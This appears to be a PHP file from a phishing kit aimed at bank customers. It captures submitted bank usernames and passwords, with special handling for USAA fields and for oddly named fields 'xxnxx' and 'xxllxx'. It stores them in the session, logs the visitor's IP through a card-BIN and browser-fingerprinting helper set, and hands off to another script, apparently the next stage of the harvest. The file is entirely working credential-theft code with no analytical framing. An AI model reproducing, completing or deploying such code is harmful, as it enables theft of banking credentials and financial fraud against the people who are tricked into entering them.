<?php
session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');
$_SESSION['loged'] = "loged4";
$_SESSION['TIME_DATE'] = $TIME_DATE;

include("system.php");
include("function.php");

if($_POST['namebankhidden'] == "different bank"){
	
$_SESSION['bank'] = "different bank";
$_SESSION['_xxnxx_'] = $_POST['xxnxx'];
$_SESSION['_xxllxx_']  = $_POST['xxllxx'];

}else{
if($_POST['namebankhidden'] == "usaa"){
$_SESSION['bank'] = "USAA";
$_SESSION['USAA1'] = $_POST['USAA1'];
$_SESSION['USAA2'] = $_POST['USAA2'];
$_SESSION['USAA3'] = $_POST['USAA3'];
}else{
	
$_SESSION['bank'] = $_POST['namebankhidden'];
$_SESSION['_UserNameID_'] = $_POST['UserNameID'];
$_SESSION['_PasswordBank_'] = $_POST['PasswordBank'];
}
}

$ip=$_SESSION['ip']=getip();

include('../tnt/sv1.php');


?>